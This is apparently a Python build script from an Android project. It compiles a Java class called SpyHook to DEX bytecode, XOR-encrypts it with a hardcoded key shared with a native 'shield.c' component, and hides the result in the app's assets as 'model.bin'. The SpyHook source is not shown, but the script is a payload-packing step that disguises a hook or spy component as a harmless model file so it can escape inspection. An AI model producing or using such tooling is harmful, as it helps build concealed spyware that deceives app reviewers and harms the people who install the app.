#!/usr/bin/env python3
"""Compile SpyHook.java → payload.dex → XOR encrypt → app/src/main/assets/model.bin"""
import subprocess, os, shutil, sys

HERE = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(HERE, "..", "app", "src", "main", "assets")
SRC = os.path.join(HERE, "SpyHook.java")
TMP_CLASSES = os.path.join(HERE, "tmp_classes")
TMP_DEX = os.path.join(HERE, "tmp.dex")
OUT = os.path.join(ASSETS, "model.bin")

# Key must match shield.c
KEY = bytes([0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, 0x8F])

def find_sdk():
    sdk = os.environ.get("ANDROID_SDK_ROOT") or os.environ.get("ANDROID_HOME")
    if sdk: return sdk
    home = os.path.expanduser("~")
    for p in [os.path.join(home, "Android", "Sdk"),
              os.path.join(home, "android", "sdk"),
              os.path.join(home, ".android", "sdk"),
              r"C:\Android\Sdk",
              r"C:\Program Files (x86)\Android\android-sdk",
              r"C:\Program Files\Android\Android Studio\jbr\bin"]:
        if os.path.isdir(p): return p
    return None

def find_build_tools(sdk):
    if not sdk: return None
    bt = os.path.join(sdk, "build-tools")
    if not os.path.isdir(bt): return None
    vers = sorted(os.listdir(bt), reverse=True)
    return os.path.join(bt, vers[0]) if vers else None

def main():
    sdk = find_sdk()
    if not sdk:
        print("FAIL: ANDROID_SDK_ROOT not set and no SDK found")
        sys.exit(1)
    bt = find_build_tools(sdk)
    if not bt:
        print(f"FAIL: no build-tools in {sdk}/build-tools")
        sys.exit(1)

    android_jar = os.path.join(sdk, "platforms", "android-34", "android.jar")
    if not os.path.exists(android_jar):
        print(f"WARN: {android_jar} not found, trying android-33")
        android_jar = os.path.join(sdk, "platforms", "android-33", "android.jar")
    if not os.path.exists(android_jar):
        print(f"WARN: {android_jar} not found, trying android-32")
        android_jar = os.path.join(sdk, "platforms", "android-32", "android.jar")

    # Find d8 or dx
    d8 = os.path.join(bt, "d8")
    dx = os.path.join(bt, "dx")
    dexer = d8 if os.path.exists(d8) else dx

    # Find javac
    javac = shutil.which("javac")
    if not javac:
        java_home = os.environ.get("JAVA_HOME")
        if java_home:
            javac = os.path.join(java_home, "bin", "javac")
    if not javac:
        print("FAIL: javac not found")
        sys.exit(1)

    # Find the Hook interface class - need to compile it too or provide its stub
    hook_jar = os.path.join(HERE, "hook_stub.jar")
    # We need the Hook.class to compile SpyHook against it
    # For CI, we compile the whole app first, then extract Hook.class or just compile against the app jar
    # Actually, simpler: include a pre-compiled Hook.class stub

    os.makedirs(TMP_CLASSES, exist_ok=True)
    os.makedirs(ASSETS, exist_ok=True)

    # Compile SpyHook.java (with android.jar on classpath)
    cp = android_jar
    if os.path.exists(hook_jar):
        cp = android_jar + os.pathsep + hook_jar

    cmd = [javac, "-d", TMP_CLASSES, "-cp", cp, SRC]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"FAIL: javac error:\n{r.stderr}")
        sys.exit(1)

    # DEX the classes
    classes_dir = TMP_CLASSES
    if dexer.endswith("d8"):
        cmd = [dexer, "--lib", android_jar, "--output", TMP_DEX, classes_dir]
    else:
        cmd = [dexer, "--dex", "--output", TMP_DEX, classes_dir]

    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"FAIL: dexer error:\n{r.stderr}")
        sys.exit(1)

    # Read and encrypt
    with open(TMP_DEX, "rb") as f:
        data = f.read()
    encrypted = bytes(data[i] ^ KEY[i & 7] for i in range(len(data)))
    with open(OUT, "wb") as f:
        f.write(encrypted)

    print(f"OK: {len(data)} bytes DEX → {OUT} ({len(encrypted)} encrypted)")

    # Cleanup
    for p in [TMP_CLASSES, TMP_DEX]:
        if os.path.isdir(p):
            shutil.rmtree(p)
        elif os.path.isfile(p):
            os.remove(p)

if __name__ == "__main__":
    main()
